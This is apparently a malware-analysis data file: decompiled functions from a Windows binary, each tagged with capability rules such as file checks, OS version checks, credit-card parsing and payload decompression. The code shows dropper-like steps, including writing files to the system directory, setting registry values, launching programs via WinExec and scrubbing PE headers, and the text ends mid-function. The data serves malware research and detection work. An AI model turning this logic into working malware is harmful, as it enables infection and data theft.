{
    "00401110": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401280) overlaps instruction at (ram,0x0040127d)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00401274)\n\nint32_t __fastcall fcn.00401110(uint param_1, uint param_2, uint *param_3)\n\n{\n    char *pcVar1;\n    uint *arg_8h;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uint32_t unaff_EBX;\n    uint32_t uVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar uVar7;\n    char cVar8;\n    bool bVar9;\n    unkbyte6 Var10;\n    uchar *puStack556;\n    uchar uStack536;\n    uint uStack535;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack16;\n    \n    uStack536 = 0;\n    puVar6 = &uStack535;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    uStack276 = 0;\n    puVar6 = &uStack275;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    uStack16 = 1;\n    *(puVar6 + 2) = 0;\n    uVar7 = unaff_EBX >> 8 < param_2 >> 8;\n    cVar8 = puVar6 + 3 == 1;\n    puStack556 = &uStack536;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puVar5 = &stack0xfffffffc;\n    if ((!uVar7) && (puVar5 = &stack0xfffffffc,  uVar7)) {\n        if (extraout_ECX != 1 && cVar8 != '\\0') {\n            LOCK();\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(puVar6 + 3) = param_3 + 1;\n        param_3 = 0x8db8ec44;\n        puVar5 = &stack0xfffffffd;\n    }\n    fcn.004014a0();\n    uVar4 = (unaff_EBX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff;\n    puVar6 = *(puVar5 + 0xc);\n    iVar3 = fcn.00401e40(param_3, puVar6, *(puVar5 + 0x10), *(puVar5 + 0x14), *(puVar5 + -4), *(puVar5 + -8));\n    if (iVar3 == 0) {\n        return 0;\n    }\n    *0x42093c = fcn.00402de0();\n    iVar3 = *0x42093c + 1;\n    arg_8h = param_3 + 1;\n    *puVar6 = *param_3;\n    *(uVar4 + 0x42093c) = *(uVar4 + 0x42093c) + (iVar3 >> 8);\n    Var10 = fcn.004029a0(puVar5 + -0x110, *(puVar5 + -4), *(puVar5 + -8));\n    bVar9 = Var10 == 0;\n    if (bVar9) {\n        return 0;\n    }\n    if ((bVar9) || (!bVar9)) {\ncode_r0x0040126b:\n        fcn.00402bb0();\n        iVar3 = fcn.00404000(0x42046c);\n        if (iVar3 == -1) {\n            iVar3 = fcn.00404000(0x420460);\n            if (iVar3 == -1) goto code_r0x0040130a;\n            uVar4 = 0xf;\n        }\n        else {\n            uVar4 = 0xe;\n        }\n        iVar3 = fcn.00402cc0(arg_8h);\n        bVar9 = iVar3 == 0;\n    }\n    else {\n        uVar2 = in(Var10 >> 0x20);\n        puVar6[1] = uVar2;\n        if (0 < &puStack556) {\n            *0xdee00025 = *0xdee00025 ^ Var10 >> 0x28;\n            goto code_r0x0040126b;\n        }\n        pcVar1 = uVar4 + 0xc08508c4;\n        *pcVar1 = *pcVar1;\n        bVar9 = *pcVar1 == '\\0';\n    }\n    if (!bVar9) {\n        fcn.00404250(uVar4);\n        fcn.00403e90(uVar4);\n        return 1;\n    }\n    if (*0x42093c == 0) {\n        return 0;\n    }\ncode_r0x0040130a:\n    iVar3 = fcn.00402290(arg_8h, puVar5 + -0x110);\n    if (iVar3 == 0) {\n        *(puVar5 + -0xc) = 0;\n    }\n    if ((*(puVar5 + -0xc) != 0) && (iVar3 = fcn.00401bc0(arg_8h),  iVar3 == 0)) {\n        *(puVar5 + -0xc) = 0;\n    }\n    iVar3 = *(puVar5 + -0xc);\n    if (iVar3 == 0) {\n        iVar3 = fcn.00402ee0(*(puVar5 + 8), 0);\n        *(puVar5 + -0xc) = iVar3;\n    }\n    if (iVar3 != 0) {\n        fcn.00403e90(0xff);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(0xe8);\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x80, 0);\n    return iVar3;\n}\n",
        "token_count": 1444
    },
    "004016f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401756) overlaps instruction at (ram,0x00401755)\n// \n// WARNING: Removing unreachable block (ram,0x0040186e)\n\nvoid fcn.004016f0(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, int32_t param_7)\n\n{\n    char cVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    uint32_t extraout_ECX;\n    uint32_t extraout_EDX;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    bool bVar6;\n    bool bVar7;\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack12 [4];\n    uint uStack8;\n    uint uStack4;\n    \n    while( true ) {\n        uStack4 = unaff_EBP;\n        cVar1 = fcn.00402310(param_5, param_6, param_1, 0x20, param_7 + 0x20);\n        uVar4 = (extraout_ECX ^ 0x6dd) + 1;\n        bVar6 = false;\n        bVar7 = (extraout_ECX & 0xffff0000 | uVar4 & 0xff | (uVar4 >> 8) + cVar1 << 8) == extraout_EDX;\n        fcn.00402310(param_5, param_6, param_2, 0x20, param_7 + 0x60);\n        if ((!bVar6 && !bVar7) && (bVar6 || bVar7)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        puVar2 = fcn.00402310(param_5, param_6, param_3, 0x20, param_7 + 0xa0);\n        if ((bVar6) || (!bVar6)) break;\n        if (&stack0xfffffebc < *puVar2 || puVar2 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        unaff_EBP = &uStack4 + 1;\n    }\n    fcn.00402310(param_5, param_6, param_4, 0x20, param_7 + 0xe0);\n    iVar3 = fcn.004016a0();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(param_7 + 0x120) = iVar3 % 5;\n    }\n    else {\n        *(param_7 + 0x120) = iVar3;\n    }\n    uStack272 = 0;\n    puVar5 = &uStack271;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    uStack8 = 0x104;\n    *(puVar5 + 2) = 0;\n    iVar3 = fcn.00403ea0(0x80000001, 0x4206a0, 0x4206cc, auStack12, &uStack272, &uStack8);\n    if ((iVar3 != 0) && (iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)(),  iVar3 == 0)) {\n        *(param_7 + 0x120) = *(param_7 + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 855
    },
    "004023f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004024b7) overlaps instruction at (ram,0x004024b6)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004023f0(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    char *pcVar6;\n    char *unaff_EBX;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    uint *puVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    ulong uVar9;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    uint uStack31;\n    char cVar5;\n    \n    uVar9 = fcn.00402a80();\n    pcVar6 = uVar9 >> 0x20;\n    pcVar3 = uVar9;\n    bVar8 = (POPCOUNT(pcVar3 & 0xff) & 1U) == 0;\n    if (pcVar3 == NULL) {\n        fcn.004025a0();\n        return false;\n    }\n    if ((bVar8) || (!bVar8)) {\n        fcn.00404100();\n    }\n    else {\n        out(*unaff_ESI, uVar9 >> 0x20);\n        do {\n            cVar5 = pcVar3 >> 8;\n            in_AF = 9 < (pcVar3 & 0xf) | in_AF;\n            pcVar3 = CONCAT31(CONCAT21(pcVar3 >> 0x10, cVar5 - in_AF), -in_AF);\n        } while (in_AF || cVar5 == *pcVar6);\n        piVar1 = unaff_EDI + pcVar6 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(extraout_ECX + -0x18) = pcVar3;\n        *pcVar3 = *pcVar3 + -in_AF;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    iVar4 = fcn.00404000(0x420478);\n    if (iVar4 != -1) {\n        iVar4 = fcn.00404000(0x42046c);\n        if (iVar4 == -1) {\n            fcn.004025a0();\n        }\n        return false;\n    }\n    fcn.004039c0();\n    iVar4 = fcn.00402890();\n    if (iVar4 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_1fh = *unaff_ESI;\n    *0x1 = *0x1 + '\\x01';\n    *unaff_EBX = *unaff_EBX + -0x2e;\n    var_80h._0_1_ = 0x32;\n    puVar7 = &var_1fh;\n    for (iVar4 = 7; puVar2 = puVar7 + 1,  iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar2 = 1;\n        puVar7 = puVar2;\n    }\n    *puVar2 = 1;\n    *(puVar7 + 6) = 1;\n    var_60h._0_1_ = 0x32;\n    puVar7 = &var_80h + 1;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    var_40h._0_1_ = 0x32;\n    puVar7 = &var_60h + 1;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    puVar7 = &var_40h + 1;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    iVar4 = fcn.00401f80(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar4 == 0) {\n        return false;\n    }\n    iVar4 = fcn.004018f0(&var_20h);\n    if (iVar4 == 0) {\n        return false;\n    }\n    iVar4 = fcn.00401110(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar4 != 0;\n}\n",
        "token_count": 1173
    },
    "00402890": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402890(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403d70(0x420414);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "004028d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004028d0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00404000(0x420480);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 209
    },
    "004029a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004029a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t arg_8h_00;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uint8_t extraout_DL;\n    uint8_t in_AF;\n    bool bVar4;\n    \n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == 0xffffffff) {\n        return 0;\n    }\n    if ((arg_8h_00 < 0) || (arg_8h_00 < 0x80000000)) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, *0x10 + 4, 0);\n        bVar4 = iVar3 == 0;\n        if (bVar4) {\n            return 0;\n        }\n        if ((!bVar4) && (bVar4)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        if (*0x42093c != 0) {\n            iVar3 = fcn.004028d0(arg_8h_00);\n            *0x42093c = iVar3 == 0;\n        }\n        fcn.00402690(0, arg_8h_00);\n        if (*0x42093c == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n        }\n        return 1;\n    }\n    in_AF = 9 < (arg_8h_00 & 0xf) | in_AF;\n    puVar2 = arg_8h_00 & 0xffff0000 | CONCAT11((arg_8h_00 >> 8) + in_AF, arg_8h_00 + in_AF * '\\x06') & 0xff0f;\n    if (extraout_ECX != 0) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar1 = *puVar2;\n    *puVar2 = *puVar2 + extraout_DL;\n    if (puVar2 + CARRY1(uVar1, extraout_DL) + 0x405041 != NULL) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00, puVar2);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 605
    },
    "00402cf0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00402cf0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 70
    },
    "00402de0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10ch\n\nbool fcn.00402de0(void)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EDI;\n    uchar auStack275 [3];\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    _auStack275 = _auStack275 & 0xff000000 | unaff_EDI >> 8;\n    var_4h = 0x104;\n    iVar1 = fcn.00403ea0(0x80000002, 0x420884, 0x4208c4, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0, _auStack275);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 215
    },
    "00404000": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404000(uint arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    uint var_8h;\n    int32_t hObject;\n    \n    var_8h = 0xffffffff;\n    hObject = (**0x42095c)();\n    if (hObject == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar4 = &var_12ch;\n    for (iVar3 = 0x49; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    iVar3 = (**0x420960)();\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    uVar1 = var_8h;\n    while( true ) {\n        var_8h = uVar1;\n        if (iVar3 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            return uVar1;\n        }\n        iVar3 = (*pcVar2)(&var_10ch, arg_8h);\n        if (iVar3 == 0) break;\n        iVar3 = (**0x420964)(hObject, &var_130h);\n        uVar1 = var_8h;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    return var_128h;\n}\n",
        "token_count": 382
    },
    "004013f0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004013f0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (0 < arg_14h) {\n        do {\n            *(var_4h + arg_10h) = arg_14h ^ *(var_4h + arg_10h) ^ *(var_4h % arg_ch + arg_8h);\n            var_4h = var_4h + 1;\n        } while (var_4h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "004016a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.004016a0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00403ea0(0x80000002, 0x420608, 0x420654, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00402a80": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00402a80(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 120
    },
    "00402ee0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ee0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    bool bVar7;\n    uint8_t in_IF;\n    bool bVar8;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    bVar8 = false;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    bVar7 = arg_ch == 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    if ((!bVar7) && (bVar7)) {\n        bVar8 = ((in_IF & 1) * '\\x02' & 4) != 0;\n    }\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x490, arg_8h);\n    (*pcVar2)(&var_264h, 0x4a8, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + bVar8 * -2 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + bVar8 * -2 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4204d0;\n    var_30h = 0x4204dc;\n    var_2ch = 0x4204e8;\n    var_28h = 0x4204f8;\n    var_24h = 0x420500;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if (!bVar7 < 5) {\n        uVar4 = !bVar7 * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1178
    },
    "00401a10": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ba8) overlaps instruction at (ram,0x00401ba6)\n// \n\nuint __fastcall fcn.00401a10(int32_t *param_1, char *param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int16_t *piVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar10;\n    uint8_t *unaff_EBX;\n    uchar **ppuVar11;\n    uchar **ppuVar12;\n    uchar *puVar13;\n    uint *puVar14;\n    int32_t unaff_EDI;\n    uchar *puVar15;\n    uint *puVar16;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar17;\n    bool bVar18;\n    bool bVar19;\n    uint8_t in_IF;\n    bool bVar20;\n    bool bVar21;\n    uchar *apuStack28 [2];\n    uint uStack8;\n    char cVar9;\n    \n    bVar20 = false;\n    puVar14 = &stack0xfffffffc;\n    ppuVar12 = &stack0xfffffffc;\n    if ((!in_ZF) && (ppuVar12 = &stack0xfffffffc,  in_ZF)) {\n        ppuVar11 = apuStack28 + 1;\n        ppuVar12 = apuStack28 + 1;\n        apuStack28[1] = &stack0xfffffffc;\n        cVar9 = '\\x10';\n        do {\n            puVar14 = puVar14 + -1;\n            ppuVar11 = ppuVar11 + -1;\n            *ppuVar11 = *puVar14;\n            cVar9 = cVar9 + -1;\n        } while ('\\0' < cVar9);\n    }\n    piVar3 = *(ppuVar12 + 8);\n    bVar18 = *piVar3 + -0x5a4d < 0;\n    if (*piVar3 != 0x5a4d) {\n        return 0;\n    }\n    if ((bVar18) || (!bVar18)) {\n        param_1 = *(piVar3 + 0x1e) + piVar3;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    if (*param_1 != 0x4550) {\n        return 0;\n    }\n    puVar5 = param_1[0x16];\n    bVar17 = puVar5 == NULL;\n    bVar18 = (POPCOUNT(puVar5 & 0xff) & 1U) == 0;\n    if (!bVar17) {\n        return 0;\n    }\n    if ((!bVar17) && (bVar17)) {\n        bVar20 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        in_AF = ((in_AF & 1) * '\\x10' & 0x10) != 0;\n    }\n    if ((bVar18) || (!bVar18)) {\n        puVar13 = 0x40;\n        puVar5 = *(ppuVar12 + 8);\n        puVar1 = puVar5 + 0x3c;\n        bVar18 = *puVar1 < 0x80;\n        bVar21 = SBORROW4(*puVar1, 0x80);\n        bVar19 = *puVar1 - 0x80 < 0;\n        bVar17 = *puVar1 == 0x80;\n    }\n    else {\n        puVar13 = bVar20 * -8 + 0x44;\n        out(*0x40, param_2);\n        do {\n            cVar9 = puVar5 >> 8;\n            in_AF = 9 < (puVar5 & 0xf) | in_AF;\n            uVar4 = -in_AF;\n            puVar5 = CONCAT31(CONCAT21(puVar5 >> 0x10, cVar9 - in_AF), uVar4);\n        } while (in_AF || cVar9 == *param_2);\n        piVar2 = unaff_EDI + param_2 * 2;\n        *piVar2 = (*piVar2 + 0x7b) - in_AF;\n        *(param_1 + -0x75) = puVar5;\n        ppuVar12 = ppuVar12 + 1;\n        *(param_1 + 0x200f1e) = *(param_1 + 0x200f1e) | uVar4;\n        bVar18 = CARRY1(*puVar5, uVar4);\n        bVar21 = SCARRY1(*puVar5, uVar4);\n        *puVar5 = *puVar5 + uVar4;\n        bVar19 = *puVar5 < '\\0';\n        bVar17 = *puVar5 == 0;\n    }\n    if (bVar18 || bVar17) {\n        return 0;\n    }\n    if ((bVar21 == bVar19) && (bVar21 != bVar19)) {\n        puVar6 = puVar13 + 1;\n        *puVar6 = *puVar6;\n        unaff_EBX[3] = unaff_EBX[3] + (param_2 >> 8);\n    }\n    else {\n        puVar6 = *(puVar5 + 0x3c);\n        if (0xbf < puVar6) goto code_r0x00401afe;\n    }\n    puVar13 = puVar6 + -0x80;\ncode_r0x00401afe:\n    iVar7 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(puVar13);\n    *(ppuVar12 + -4) = iVar7;\n    if (iVar7 == 0) {\n        return 0;\n    }\n    puVar6 = NULL;\n    if (puVar13 != NULL) {\n        do {\n            iVar8 = (*_sym.imp.MSVCRT.dll_rand)();\n            puVar15 = puVar6 + 1;\n            puVar6[iVar7] = iVar8 % 0xff;\n            puVar6 = puVar15;\n        } while (puVar15 < puVar13);\n    }\n    puVar14 = *(ppuVar12 + -4);\n    puVar16 = *(ppuVar12 + 8) + 0x80;\n    for (uVar10 = puVar13 >> 2; uVar10 != 0; uVar10 = uVar10 - 1) {\n        *puVar16 = *puVar14;\n        puVar14 = puVar14 + bVar20 * -2 + 1;\n        puVar16 = puVar16 + bVar20 * -2 + 1;\n    }\n    for (uVar10 = puVar13 & 3; uVar10 != 0; uVar10 = uVar10 - 1) {\n        *puVar16 = *puVar14;\n        puVar14 = puVar14 + bVar20 * -2 + 1;\n        puVar16 = puVar16 + bVar20 * -2 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(*(ppuVar12 + -4));\n    return 1;\n}\n",
        "token_count": 1652
    },
    "00402690": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040273f) overlaps instruction at (ram,0x0040273a)\n// \n// WARNING: Removing unreachable block (ram,0x0040277a)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402690(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    unkbyte6 Var3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    int32_t unaff_ESI;\n    uint *puVar9;\n    int32_t *piVar10;\n    int32_t *piVar11;\n    uint *puVar12;\n    char *pcVar13;\n    char *pcVar14;\n    bool bVar15;\n    char cVar16;\n    uchar lpBuffer;\n    uint var_22fh;\n    uint var_12ch;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t hFile;\n    \n    puVar8 = &stack0xfffffffc;\n    lpBuffer = 0;\n    var_12ch._0_1_ = 0;\n    puVar9 = &var_22fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    bVar15 = false;\n    cVar16 = '\\x01';\n    puVar9 = &var_12ch + 1;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    piVar10 = puVar9 + 3;\n    *(puVar9 + 2) = 0;\n    hFile = arg_ch;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    Var3 = *0xbf17b43a;\n    if ((bVar15) || (!bVar15)) {\n        piVar10 = &lpBuffer;\n    }\n    else {\n        if 